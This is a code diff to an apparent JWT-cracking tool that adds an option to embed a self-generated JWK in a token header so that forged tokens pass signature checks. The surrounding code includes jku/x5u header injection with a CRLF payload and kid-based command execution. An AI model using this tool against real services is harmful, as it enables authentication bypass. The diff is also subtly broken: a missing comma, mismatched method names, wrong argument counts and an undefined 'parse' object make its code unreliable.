@@ -152,7 +152,8 @@ class Cracker:
         """
 
     def __init__(self, token, alg, path_to_key, user_payload, remove_from, add_into, auto_try, kid, kid_curl_info, exec_via_kid, specified_key,
-                 jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False, manual=False):
+                 jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False, manual=False
+                 generate_jwk=False):
         """
         :param token: The user input token -> str.
         :param alg: The algorithm for the attack. HS256 or None -> str.
@@ -173,6 +174,7 @@ class Cracker:
         :param unverified: A flag to set if the script have to act as the host doesn't verify the signature -> Bool.
         :param decode: A flag to set if the user need only to decode the token -> Bool.
         :param manual: A flag to set if the user need to craft an url manually -> Bool.
+        :param generate_jwk: A flag, if present a jwk will be generated and inserted in the token header -> Bool.
 
         Initialize the variables that we need to be able to access from all the class; all the params plus
         self.file and self.token. Then it call the validation method to validate some of these variables (see below),
@@ -202,8 +204,9 @@ class Cracker:
         self.unverified = unverified
         self.decode = decode
         self.manual = manual
+        self.generate_jwk = generate_jwk
         """Groups args based on requirements"""
-        self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_header_injection]
+        self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_header_injection, self.generate_jwk]
         self.require_alg_args = [self.path_to_key, self.auto_try, self.kid, self.specified_key] + self.jwks_args
         """Store a command that need to run in case of x5u injection and open devnull"""
         self.x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/C=US/State=Ohio/L=Columbus/O=TestingInc/CN=testing"'
@@ -288,7 +291,7 @@ class Cracker:
                 print(f"{Bcolors.FAIL}jwtcrk: err: You can't pass any key related arg with jku attacks{Bcolors.ENDC}")
                 sys.exit(2)
             if not self.x5u_basic and not self.x5u_header_injection:
-                """A jku related argument has been passed"""
+                """No x5u related argument has been passed"""
                 """Generate a key with OpenSSL"""
                 key = OpenSSL.crypto.PKey()
                 key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
@@ -507,6 +510,8 @@ class Cracker:
             injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
             url = self.x5u_header_injection.replace("HERE", injection)
             header_dict['x5u'] = url
+        elif self.generate_jwk:
+            header_dict = Cracker.embed_jwk_in_header(header_dict, self.n, self.e, "identifier")
         if self.user_payload:
             for item in self.user_payload:
                 payload_dict = Cracker.change_payload(item[0], payload_dict)
@@ -948,6 +953,30 @@ class Cracker:
         devnull_.close()
         return key
 
+    @staticmethod
+    def generate_jwk(n, e, kid):
+        jwk = dict()
+        jwk['kty'] = "RSA"
+        jwk['kid'] = kid
+        jwk['use'] = "sig"
+        jwk['n'] = n
+        jwk['e'] = e
+        return jwk
+
+    @staticmethod
+    def embed_jwk_in_jwt_header(iterable, n, e, kid):
+        """
+        :param iterable: The header dictionary -> dict
+        :param n: The modulus of the public key -> str
+        :param e: The exponent of the public key -> str
+        :param kid: A string to be used as kid -> str
+
+        :return: The modified header dictionary
+        """
+        crafted_jwk = Cracker.generate_jwk(iterable, n, e, kid)
+        iterable['jwk'] = crafted_jwk
+        return iterable
+
     def run(self):
         """
         The function to run the attack.
@@ -1069,6 +1098,10 @@ if __name__ == '__main__':
                         help="Use this flag with jku/x5u basic if you need to craft an url without the tool appending or replaceing anything to it",
                         required=False
                         )
+    parse.add_argument("--generate-jwk", action="store_true",
+                       help="Generate a jwk and insert it in the token header",
+                       required=False
+                       )
 
     # Parse arguments
     args = parser.parse_args()
@@ -1076,7 +1109,7 @@ if __name__ == '__main__':
     cracker = Cracker(
         args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.kid_curl_info,
         args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody,
-        args.unverified, args.decode, args.manual,
+        args.unverified, args.decode, args.manual, args.generate_jwk,
     )
     # Start the cracker
     cracker.run()
